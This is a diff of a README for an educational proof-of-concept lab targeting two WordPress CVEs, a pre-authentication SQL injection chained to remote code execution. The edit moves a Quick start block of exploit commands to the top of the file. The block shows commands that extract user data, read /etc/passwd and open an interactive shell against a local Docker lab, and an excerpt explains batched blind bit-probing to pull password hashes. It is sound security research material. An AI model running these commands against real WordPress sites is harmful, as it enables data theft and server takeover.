@@ -4,6 +4,39 @@ Educational PoC and lab for **CVE-2026-63030 + CVE-2026-60137**: pre-authenticat
 
 Discovered by Adam Kues (Searchlight Cyber / Assetnote). Fixed in WordPress 6.9.5 / 7.0.2.
 
+## Quick start
+
+```bash
+# bring up the vulnerable lab
+cd docker && ./setup.sh
+cd ..
+
+# detect
+python3 -m exploit check http://localhost:8888
+python3 -m exploit check http://localhost:8888 --confirm-sqli
+
+# extract data (fast mode, default)
+python3 -m exploit extract http://localhost:8888 --preset fingerprint
+python3 -m exploit extract http://localhost:8888 --preset users
+
+# extract data (blind mode, for comparison)
+python3 -m exploit extract http://localhost:8888 --mode blind --preset fingerprint
+
+# custom SQL query
+python3 -m exploit extract http://localhost:8888 --query "SELECT @@version"
+
+# RCE (requires FILE privilege, the lab grants it)
+python3 -m exploit rce http://localhost:8888 --cmd "id"
+python3 -m exploit rce http://localhost:8888 --cmd "cat /etc/passwd"
+python3 -m exploit rce http://localhost:8888 -i   # interactive shell
+
+# proxy through Burp
+python3 -m exploit extract http://localhost:8888 --proxy http://127.0.0.1:8080
+
+# tear down
+cd docker && ./setup.sh down
+```
+
 ## Writeup
 
 ### Step 1: The batch endpoint is unauthenticated
@@ -151,39 +184,6 @@ UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 2) > 0   -- bit 1
 **Unlimited inner batch.** The outer batch validates `maxItems: 25` via its schema. The route confusion bypasses this: the inner batch runs recursively with no size check. All 7 bit-probes for multiple characters pack into one request.
 
 16 chars x 7 bits = 112 probes per request. A 34-char phpass hash in ~3 requests instead of ~224.
-
-## Quick start
-
-```bash
-# bring up the vulnerable lab
-cd docker && ./setup.sh
-cd ..
-
-# detect
-python3 -m exploit check http://localhost:8888
-python3 -m exploit check http://localhost:8888 --confirm-sqli
-
-# extract data (fast mode, default)
-python3 -m exploit extract http://localhost:8888 --preset fingerprint
-python3 -m exploit extract http://localhost:8888 --preset users
-
-# extract data (blind mode, for comparison)
-python3 -m exploit extract http://localhost:8888 --mode blind --preset fingerprint
-
-# custom SQL query
-python3 -m exploit extract http://localhost:8888 --query "SELECT @@version"
-
-# RCE (requires FILE privilege, the lab grants it)
-python3 -m exploit rce http://localhost:8888 --cmd "id"
-python3 -m exploit rce http://localhost:8888 --cmd "cat /etc/passwd"
-python3 -m exploit rce http://localhost:8888 -i   # interactive shell
-
-# proxy through Burp
-python3 -m exploit extract http://localhost:8888 --proxy http://127.0.0.1:8080
-
-# tear down
-cd docker && ./setup.sh down
-```
 
 ## References
 
